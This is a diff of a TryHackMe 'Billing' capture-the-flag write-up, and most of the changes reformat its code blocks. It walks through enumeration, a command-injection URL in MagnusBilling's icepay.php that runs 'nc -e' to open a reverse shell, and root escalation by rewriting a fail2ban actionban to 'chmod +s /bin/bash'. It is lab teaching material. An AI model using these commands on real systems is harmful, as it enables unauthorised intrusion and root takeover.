@@ -21,23 +21,22 @@ tags:
 # Introduction
 -------------
 
-This writeup documents the penetration testing of the [**Billing**](https://tryhackme.com/room/billing) machine from the [**TryHackMe**](https://tryhackme.com/) platform. 
-
-In this case I'll exploit a vulnerable site with a LFI used as RCE to gain a reverse shell and privesc abusing a sudo binary. Note from the description: Bruteforcing is out of scope for this room.
+This writeup documents the penetration testing of the [**Billing**](https://tryhackme.com/room/billing) machine from the [**TryHackMe**](https://tryhackme.com/) platform. In this case I'll exploit a vulnerable site with a LFI used as RCE to gain a reverse shell and privesc abusing a sudo binary. Note from the description: Bruteforcing is out of scope for this room.
 
 <br>
 # Information Gathering
 ------------------
 
-Once we have discovered the IP of the machine we need to enumerate as much information as possible.
+After identifying the target's IP address, we need to enumerate as  much information as possible about the host.
 
-When we ping a machine that is in our local network, normally:
-* TTL 64: Linux machine.
-* TTL 128: Windows machine.
-We can also use the [**whichSystem**](https://github.com/Akronox/WichSystem.py) script.
+A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
+* TTL 64: Linux.
+* TTL 128: Windows.
 
-```java
+```bash
 ❯ ping -c 1 10.81.159.65
+```
+```
 PING 10.81.159.65 (10.81.159.65) 56(84) bytes of data.
 64 bytes from 10.81.159.65: icmp_seq=1 ttl=62 time=54.7 ms
 
@@ -46,10 +45,12 @@ PING 10.81.159.65 (10.81.159.65) 56(84) bytes of data.
 rtt min/avg/max/mdev = 54.724/54.724/54.724/0.000 ms
 ```
 
-In this case, it seems to be a Linux machine. Let's do a port scan with nmap.
+In this case, it seems to be a Linux machine. Let's perform some scans.
 
-```java
+```bash
 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.81.159.65 -oG allPorts
+```
+```
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-07 16:03 CET
 Initiating SYN Stealth Scan at 16:03
@@ -75,10 +76,10 @@ Nmap done: 1 IP address (1 host up) scanned in 21.06 seconds
            Raw packets sent: 103000 (4.532MB) | Rcvd: 66159 (3.305MB)
 ```
 
-Let's perform a deeper scan with the parameter ``-sCV`` over those ports.
-
-```java
+```bash
 ❯ nmap -sCV -p22,80,3306,5038 10.81.159.65 -oN targeted
+```
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-07 16:04 CET
 Nmap scan report for 10.81.159.65
 Host is up (0.055s latency).
@@ -108,12 +109,18 @@ We can't do much with the SSH service since we don't have credentials yet. Now i
 
 We see in nmap's output a disallowed entry for ``robots.txt``.
 
-```
+```bash
 ❯ whatweb http://10.81.159.65
+```
+```
 http://10.81.159.65 [302 Found] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.81.159.65], RedirectLocation[./mbilling]
 http://10.81.159.65/mbilling [301 Moved Permanently] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.81.159.65], RedirectLocation[http://10.81.159.65/mbilling/], Title[301 Moved Permanently]
+```
 
+```bash
 ❯ whatweb http://10.81.159.65/mbilling
+```
+```
 http://10.81.159.65/mbilling [301 Moved Permanently] Apache[2.4.62], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.81.159.65], RedirectLocation[http://10.81.159.65/mbilling/], Title[301 Moved Permanently]
 http://10.81.159.65/mbilling/ [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5[applicationCache], HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[10.81.159.65], Script[text/javaScript,text/javascript], Title[MagnusBilling][Title element contains newline(s)!]
 ```
@@ -126,8 +133,10 @@ Nothing interesting in the source code. The ``Forgot your password?`` link reque
 
 Let's fuzz some directories in the root directory of the web and ``/mbilling`` and see what's inside of them.
 
-```python
+```bash
 ❯ gobuster dir -u http://10.81.159.65 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
+```
+```
 ===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -149,8 +158,10 @@ Finished
 ===============================================================
 ```
 
-```python
+```bash
 ❯ gobuster dir -u http://10.81.159.65/mbilling -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
+```
+```
 ===============================================================
 Gobuster v3.8
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -188,9 +199,14 @@ As nmap showed, the MySQL service running MariaDB on the port 3306/tcp is active
 
 ```bash
 ❯ nc 10.81.159.65 3306 
+```
+```
 Host 'ip-192-168-135-33.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
-
+```
+```bash
 ❯ mysql -u root -h 10.81.159.65 -p 
+```
+```
 Enter password: ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1130 - Host 'ip-192-168-135-33.eu-west-1.compute.internal' is not allowed to connect to this MariaDB server
 ```
 
@@ -202,8 +218,10 @@ Finally, nmap showed ``Asterisk Call Manager 2.10.6``.
 # Vulnerability Assessment
 ------
 
-```java
+```bash
 ❯ searchsploit magnus
+```
+```
 ---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                                    |  Path
 ---------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -249,25 +267,29 @@ http://10.81.159.65/mbilling/lib/icepay/icepay.php?democ=testfile;%20nc%20-e%20/
 ------
 
 ```bash
-# tty upgrade
-script /dev/null -c bash
-Ctrl+Z
-stty raw -echo; fg
-reset xterm
-export TERM=xterm
-export SHELL=bash
-stty rows 44 columns 185
+# tty upgrading
+❯ script /dev/null -c bash
+❯ Ctrl+Z
+❯ stty raw -echo; fg
+❯ reset xterm
+❯ export TERM=xterm
+❯ export SHELL=bash
+❯ stty rows 44 columns 185
 ```
 
 I'm asterisk which is the user with web server privileges. The first flag it's ``user.txt``, so it might be in ``/home``.
 
-```
+```bash
 asterisk@ip-10-81-159-65:/home/magnus$ cat user.txt
+```
+```
 ***REDACTED***
 ```
 
-```
+```bash
 asterisk@ip-10-81-159-65:/home/magnus$ sudo -l
+```
+```
 Matching Defaults entries for asterisk on ip-10-81-159-65:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
@@ -280,8 +302,10 @@ User asterisk may run the following commands on ip-10-81-159-65:
 
 I noticed that ``asterisk`` can run the binary ``/usr/bin/fail2ban-client`` as root, since root is running the process.
 
-```
+```bash
 asterisk@ip-10-81-159-65:/$ ps -aux | grep fail2ban
+```
+```
 root        4572  0.0  0.7 177564 15440 ?        Sl   06:35   0:00 /usr/bin/python3 /usr/bin/fail2ban-server
 ```
 
@@ -289,7 +313,7 @@ root        4572  0.0  0.7 177564 15440 ?        Sl   06:35   0:00 /usr/bin/pyth
 
 > A **jail** is a configuration that define which logs to monitor, patterns to look for and the actions to perform when a pattern is matched. A jail example from /etc/fail2ban/jail.local would be:
 
-```bash
+```
 [asterisk-iptables]
 enabled  = true
 filter   = asterisk
@@ -303,33 +327,36 @@ The jail ``asterisk-iptables`` monitors the log file ``/var/log/asterisk/message
  
 Firstly, we clean all actions for this jail.
 
-```
+```bash
 asterisk@ip-10-81-159-65:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables actions
+```
+```
 The jail asterisk-iptables has the following actions:
 iptables-allports-ASTERISK
 ```
 
 Secondly, we modify the command to execute for ``actionban`` defined in the ``iptables-allports-ASTERISK`` action.
 
-```
+```bash
 asterisk@ip-10-81-159-65:/$ sudo /usr/bin/fail2ban-client set asterisk-iptables action iptables-allports-ASTERISK actionban 'chmod +s /bin/bash'
-chmod +s /bin/bash
 asterisk@ip-10-81-159-65:/$ sudo /usr/bin/fail2ban-client get asterisk-iptables action iptables-allports-ASTERISK actionban 
-chmod +s /bin/bash
 ```
 
 The final step is banning an IP for the ``asterisk-iptables`` jail, which will execute the command for ``actionban`` defined in the ``iptables-allports-ASTERISK`` action.
 
-```
-asterisk@ip-10-81-159-65:/$ ls -l /bin/bash
--rwxr-xr-x 1 root root 1265648 Apr 18  2025 /bin/bash
+```bash
 asterisk@ip-10-81-159-65:/$ sudo /usr/bin/fail2ban-client set asterisk-iptables banip 1.1.1.1
-1
 asterisk@ip-10-81-159-65:/$ ls -l /bin/bash
+```
+```
 -rwsr-sr-x 1 root root 1265648 Apr 18  2025 /bin/bash
-bash -p
+```
+
+```
 asterisk@ip-10-81-159-65:/$ bash -p
 bash-5.2# cat /root/root.txt
+```
+```
 ***REDACTED***
 ```
 
